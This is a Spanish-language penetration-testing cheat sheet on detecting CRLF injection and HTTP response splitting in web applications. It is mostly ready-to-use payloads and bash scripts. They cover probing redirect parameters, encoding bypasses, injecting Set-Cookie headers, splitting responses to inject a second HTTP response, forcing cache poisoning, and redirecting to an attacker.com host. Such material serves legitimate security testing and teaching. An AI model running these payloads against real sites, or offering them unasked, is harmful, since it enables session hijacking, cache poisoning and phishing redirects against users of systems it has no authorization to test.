---
aliases:
  - CRLFi Detection
  - Response Splitting Detection
  - CRLF Recon
tags:
  - vuln/crlf-injection
  - technique/discovery
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[CRLF Injection]]"
---
# CRLF Injection - Detección y Reconocimiento

---

## Identificar Puntos de Header Reflexion

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/redirect?url=ABC123" \| grep -i location` | Confirma si `url` se refleja literal en `Location` | Vector primario CRLFi. |
| `curl -sI "https://target/login?next=ABC123" \| grep -i location` | Reflejo en `next`/`return`/`continue` | Auth flow redirects. |
| `gau target.com \| grep -E '(redirect\|next\|return\|callback\|url=)' \| sort -u` | URLs candidatos con params de redirect | Recon mass. |
| `curl -sI "https://target/?lang=en-ABC" \| grep -i 'content-language'` | Header reflejado con valor del param | Custom headers de i18n. |
| `curl -sI -o /dev/null -D - "https://target/dl?file=test.txt"` | `Content-Disposition: filename=...` reflejado | Download endpoints. |
| `curl -sI "https://target/api" -H "X-Forwarded-Host: ABC" \| grep ABC` | Backend refleja XFH | Reverse proxy con header trust. |
| `httpx -l urls.txt -include-response-headers -mc 30x` | Bulk filter de redirects (30x) | Recon scale. |
^crlfi-detect-points

---

## Probes con CR/LF

| **Payload (param value)** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `test%0d%0aX-CRLF-PROBE:%20FOUND` | Header marker en response → confirma CRLFi | Probe canónico. |
| `test%0aX-LF-Only:%20F` | Si pasa → backend acepta solo LF | Algunos parsers HTTP. |
| `test%250d%250aX-Double:%20F` | Doble URL encoding bypass | Proxy + app decodifican secuencial. |
| `test%0d%0aSet-Cookie:%20pwn=1` | Confirma capacidad de inyectar Set-Cookie | Validación post-detección. |
| `test%0d%0a%0d%0a<html>MARKER</html>` | Detecta splitting + body inject (no solo header) | Response splitting completo. |
| `test%E5%98%8A%E5%98%8DX-UTF8:%20F` | UTF-8 best-fit bypass | Backends Tomcat/Java legacy. |
^crlfi-detect-probes

### Probe rápido bash

```bash
PAYLOAD='%0d%0aX-CRLF-PROBE:%20FOUND'
URL="https://target/redirect?url=test${PAYLOAD}"

R=$(curl -sI "$URL")
echo "$R"

echo "$R" | grep -i 'X-CRLF-PROBE' && echo "[+] CRLF injection confirmed"

for field in url next return goto continue redirect path; do
  R=$(curl -sI "https://target/login?$field=test${PAYLOAD}")
  if echo "$R" | grep -q 'X-CRLF-PROBE'; then
    echo "[+] CRLF en field: $field"
  fi
done
```

---

## Detectar Response Splitting Potencial

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `test%0d%0a%0d%0a<html>SPLIT-MARKER</html>` | Body reflejado completo después de `\r\n\r\n` | Splitting real (no solo header inject). |
| `test%0d%0aContent-Length:%2020%0d%0a%0d%0a<html>SPLIT</html>` | Splitting con Content-Length correcta → cacheable | Cache poisoning viable. |
| `test%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<x>` | Segunda respuesta completa inyectada | Pipeline HTTP/1.1, proxy front. |
| `test%0d%0aLocation:%20https://attacker.com` | Dos `Location` → browser usa última | Open Redirect via CRLF. |
| `test%0d%0aCache-Control:%20public,%20max-age=3600` | Forzar cache de la response inyectada | Combo cache poisoning. |
^crlfi-detect-splitting

### Workflow detection completo

```bash
TARGET="https://target/redirect"
PARAM="url"

# Stage 1: confirmar reflejo del param en header (sin CRLF)
RESP=$(curl -sI "$TARGET?$PARAM=ABC123MARKER")
echo "$RESP" | grep -i 'location:.*ABC123MARKER' && echo "[*] Reflected en Location"

# Stage 2: probe CRLF basic
PAYLOAD='test%0d%0aX-CRLFi:%20DETECTED'
curl -sI "$TARGET?$PARAM=$PAYLOAD" | grep -i 'X-CRLFi' && echo "[+] CRLF vulnerable"

# Stage 3: validar control de Set-Cookie
PAYLOAD='test%0d%0aSet-Cookie:%20pwned=1'
curl -sI "$TARGET?$PARAM=$PAYLOAD" | grep -i 'set-cookie:.*pwned' && echo "[!] Set-Cookie injection works"

# Stage 4: probe splitting + body
PAYLOAD='test%0d%0a%0d%0a<html><body>SPLIT-MARKER</body></html>'
curl -s "$TARGET?$PARAM=$PAYLOAD" | grep -q 'SPLIT-MARKER' && echo "[!!] Full response splitting"

# Stage 5: bypass matrix si Stage 2 falla
for enc in '%0d%0a' '%0a' '%0d' '%250d%250a' '%E5%98%8A%E5%98%8D' '%c2%85'; do
  echo "Testing encoding: $enc"
  curl -sI "$TARGET?$PARAM=test${enc}X-Test:%201" | grep -i 'X-Test'
done
```

---
